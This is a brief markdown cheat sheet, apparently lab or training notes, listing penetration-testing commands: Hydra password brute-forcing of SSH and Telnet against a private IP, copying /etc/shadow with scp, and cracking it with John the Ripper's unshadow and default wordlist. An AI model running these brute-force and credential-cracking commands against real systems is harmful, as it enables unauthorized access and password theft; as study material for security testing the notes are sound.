# Common Command Line tools usage

## Hydra
### SSH
```bash
# hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou.txt 192.168.99.22 ssh
```

### Telnet
```bash
# hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou.txt telnet://192.168.99.22
```
## John
### Unshadow
```bash
# unshadow passwd shadow > crackme
```

### Using default wordlist
```bash
# john crackme
```

## NMAP

## SCP
```bash
# scp root@192.168.99.22:/etc/shadow .
````

## SSH
```bash
# ssh root@192.168.99.22
```

## Telnet
```bash
# telnet 192.168.99.22 -l root
```


